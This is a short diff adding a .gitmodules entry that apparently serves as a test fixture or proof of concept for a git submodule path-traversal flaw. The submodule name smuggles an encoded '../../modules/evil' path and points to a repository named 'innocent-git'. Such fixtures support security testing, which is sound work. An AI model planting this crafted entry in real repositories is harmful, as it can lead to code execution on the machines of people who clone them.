@@ -1,0 +1,4 @@
+[submodule "%2E%2E/%2E%2E/modules/evil"]
+	path = evil
+	url = https://github.com/asanso/innocent-git
+	update = checkout
